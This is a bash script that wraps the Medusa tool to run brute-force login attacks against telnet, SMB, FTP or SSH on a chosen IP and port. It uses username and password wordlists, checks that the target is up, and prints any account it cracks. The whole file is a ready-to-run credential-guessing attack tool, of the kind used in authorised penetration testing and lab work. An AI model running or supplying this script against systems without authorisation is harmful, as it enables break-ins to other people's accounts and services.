#!/bin/bash

# Variables.
ip_address=$2
port=$3
service=$4
username_file=$5
password_file=$6
SERVICE_LIST=("telnet" "smbnt" "ftp" "ssh")
args_count=$(echo $#)
ipcalc=$(ipcalc -cn "$ip_address" | awk '{print $1}')


# Function to check if the number of arguments is valid and display usage information if not.
function CHECK_ARGS_COUNT(){
    if ! [ "$args_count" == 6 ]; then
        echo -e "[-] Bad arguments.\n"
        echo -e "\tUsage: brute <ip_address> <port> <service> <user_wl> <pass_wl>"
        echo -e "\tServices: telnet, smbnt, ftp, ssh"
        exit 1
    fi
}

# Function to check if the IP address is valid.
function CHECK_IF_IP_VALID(){
    if [ "$ipcalc" == "INVALID" ]; then
        echo "[-] IP address not valid."
        exit 1
    fi
}

# Function to check if the provided port is valid.
function CHECK_IF_PORT_IS_VALID(){
    if ! [[ $port =~ ^[0-9]+$ ]]; then 
        echo "[-] Not a valid port number";
        exit 1 
    fi
    if ! (("$port" >= 1 && "$port" <= 65535)); then
        echo "[-] Not a valid port number";
        exit 1 
    fi
}

# Function to check if the provided service is supported.
function CHECK_SERVICE_INPUT(){
    if ! [[ $(echo ${SERVICE_LIST[@]} | grep -F -w $service) ]]; then
        echo "[-] Service '$service' not suported. supported services: telnet, smbnt, ftp, ssh"
        exit 1
    fi
}

# Function to check if the host is up by sending a ping.
function CHECK_IF_HOST_UP(){
    if ! ping -c 1 -w 2 "$ip_address" 2>/dev/null 1>&2 ; then
        echo "[-] Host $ip_address is down."
        exit 1
    fi
}

# Function to check if a file exists.
function CHECK_IF_FILE_EXIST(){
    if [ ! -f $2 ]; then
        echo "[-] $1 Wordlist not found"
        exit 1
    fi
}

# Function to perform brute force login attempt using Medusa.
function BRUTE_LOGIN(){
    username_count=$(cat "$username_file" | wc -l)
    password_count=$(cat "$password_file" | wc -l)
    echo -e "\n[*] Starting $service brute force attack on $ip_address:$port [ $username_count usernames ] [ $password_count passwords ]"
    brute=$(medusa -h "$ip_address" -U "$username_file" -P "$password_file" -t 10 -f -F -M "$service" -n "$port" 2>/dev/null)
    if echo "$brute" | grep "ACCOUNT FOUND" > /dev/null 2>&1; then
        echo -e "\n[+] $(echo "$brute" | grep "ACCOUNT FOUND")"
        exit 0
    else 
        echo -e "\n[-] Brutee force failed, no match was found."
        exit 0
    fi 
}

CHECK_ARGS_COUNT
CHECK_IF_IP_VALID
CHECK_IF_PORT_IS_VALID
CHECK_SERVICE_INPUT
CHECK_IF_FILE_EXIST "Username" "$username_file"
CHECK_IF_FILE_EXIST "Password" "$password_file"
CHECK_IF_HOST_UP
BRUTE_LOGIN


